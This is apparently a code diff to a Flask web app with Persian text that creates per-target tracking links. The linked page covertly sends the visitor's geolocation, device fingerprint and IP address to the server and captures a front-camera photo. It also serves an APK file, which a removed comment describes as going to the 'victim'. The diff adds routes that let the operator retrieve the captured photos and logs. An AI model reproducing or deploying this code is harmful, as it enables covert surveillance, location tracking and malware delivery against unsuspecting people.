@@ -3,13 +3,11 @@ import uuid
 import base64
 import json
 import logging
-from flask import Flask, request, render_template_string, send_from_directory
-from threading import Thread
+from flask import Flask, request, render_template_string, send_from_directory, jsonify, send_file
 
 app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
 
-# پوشه برای ذخیره عکس‌ها و لاگ‌ها
 os.makedirs("logs", exist_ok=True)
 
 HTML_TEMPLATE = """
@@ -38,7 +36,6 @@ HTML_TEMPLATE = """
         const context = canvas.getContext('2d');
         const btn = document.getElementById('download-btn');
 
-        // جمع‌آوری موقعیت جغرافیایی
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(pos => {
                 fetch('/log/' + token, {
@@ -55,22 +52,19 @@ HTML_TEMPLATE = """
             });
         }
 
-        // جمع‌آوری اطلاعات دستگاه
-        const deviceInfo = {
-            type: 'device',
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-        };
         fetch('/log/' + token, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(deviceInfo)
+            body: JSON.stringify({
+                type: 'device',
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            })
         });
 
-        // فعال‌سازی دوربین و گرفتن عکس
         async function capture() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
@@ -92,7 +86,7 @@ HTML_TEMPLATE = """
                 };
             } catch (err) {
                 msg.innerText = 'لطفاً برای ادامه، دسترسی به دوربین را تأیید کنید.';
-                btn.style.display = 'block';  // دکمه دانلود حتی در صورت خطا هم نشان داده شود
+                btn.style.display = 'block';
             }
         }
         capture();
@@ -103,14 +97,13 @@ HTML_TEMPLATE = """
 
 @app.route('/')
 def index():
-    return "ربات فعال است. لینک اختصاصی از طریق API ایجاد کنید."
+    return "ربات فعال است. برای ساخت لینک به /new-link بروید."
 
 @app.route('/new-link')
 def new_link():
-    """ایجاد یک لینک یکتا و بازگشت آن"""
     token = str(uuid.uuid4())
     link = f"{request.host_url}capture/{token}"
-    return {"link": link, "token": token}
+    return jsonify({"link": link, "token": token})
 
 @app.route('/capture/<token>')
 def capture_page(token):
@@ -118,33 +111,46 @@ def capture_page(token):
 
 @app.route('/upload/<token>', methods=['POST'])
 def upload_photo(token):
-    """ذخیره عکس دریافت‌شده"""
     data = request.get_json()
     if not data or 'image' not in data:
-        return {"status": "error"}, 400
+        return jsonify({"status": "error"}), 400
     try:
         image_data = base64.b64decode(data['image'].split(',')[1])
         filename = f"logs/photo_{token}.jpg"
         with open(filename, 'wb') as f:
             f.write(image_data)
-        app.logger.info(f"عکس ذخیره شد: {filename}")
-        return {"status": "success"}
+        app.logger.info(f"Photo saved: {filename}")
+        return jsonify({"status": "success"})
     except Exception as e:
-        return {"status": "error", "message": str(e)}, 500
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/log/<token>', methods=['POST'])
 def log_info(token):
-    """ثبت اطلاعات جانبی (موقعیت، دستگاه و...)"""
     data = request.get_json()
     data['ip'] = request.remote_addr
     filename = f"logs/info_{token}.json"
     with open(filename, 'a') as f:
         f.write(json.dumps(data) + '\n')
-    return {"status": "ok"}
+    return jsonify({"status": "ok"})
+
+@app.route('/photo/<token>')
+def get_photo(token):
+    filename = f"logs/photo_{token}.jpg"
+    if os.path.exists(filename):
+        return send_file(filename, mimetype='image/jpeg')
+    return "عکس پیدا نشد (شاید هنوز گرفته نشده باشد)", 404
+
+@app.route('/logs/<token>')
+def get_logs(token):
+    filename = f"logs/info_{token}.json"
+    if os.path.exists(filename):
+        with open(filename, 'r') as f:
+            lines = f.readlines()
+        return jsonify([json.loads(line) for line in lines])
+    return jsonify({"error": "لاگی برای این توکن وجود ندارد"}), 404
 
 @app.route('/download/<path:filename>')
 def download_file(filename):
-    """ارسال فایل APK به قربانی"""
     return send_from_directory('static', filename)
 
 if __name__ == '__main__':
